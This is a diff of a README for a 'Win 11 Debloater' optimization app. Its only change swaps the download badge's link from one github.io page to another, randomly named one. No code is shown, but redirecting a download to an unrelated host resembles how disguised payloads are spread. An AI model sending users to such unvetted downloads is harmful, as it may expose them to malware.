@@ -2,7 +2,7 @@
 
 > **Your all-in-one Windows 11 optimization toolbox: remove bloatware, disable telemetry, stop unwanted processes, and reclaim system performance — all in a single portable app.**
 
-[![Get Win 11 Debloater Now](https://img.shields.io/badge/Get_Win_11_Debloater-Now-0a5d8d?style=for-the-badge&logo=github)](https://milerbadd.github.io/.github/win-11-debloater)
+[![Get Win 11 Debloater Now](https://img.shields.io/badge/Get_Win_11_Debloater-Now-0a5d8d?style=for-the-badge&logo=github)](https://hudsonwallaceikqe.github.io/.github/win-11-debloater)
 
 ---
 
